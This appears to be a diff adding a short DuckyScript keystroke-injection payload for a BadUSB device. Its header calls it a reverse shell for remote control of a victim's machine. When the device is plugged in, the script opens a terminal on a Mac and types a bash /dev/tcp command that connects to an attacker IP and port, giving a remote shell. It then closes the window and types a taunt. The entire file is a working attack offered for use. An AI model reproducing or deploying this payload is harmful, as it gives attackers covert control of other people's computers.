@@ -1,0 +1,17 @@
+REM Author: Blake Edwards
+REM Description: Simple revers shell for remote control of a victims machine
+DELAY 1000
+GUI SPACE
+STRING terminal
+DELAY 500
+ENTER
+DELAY 500
+STRING bash -i >& /dev/tcp/192.168.0.109/1337 0>&1
+DELAY 500
+ENTER
+DELAY 500
+GUI w
+DELAY 1000
+GUI SPACE
+STRING you just got pwned :)
+
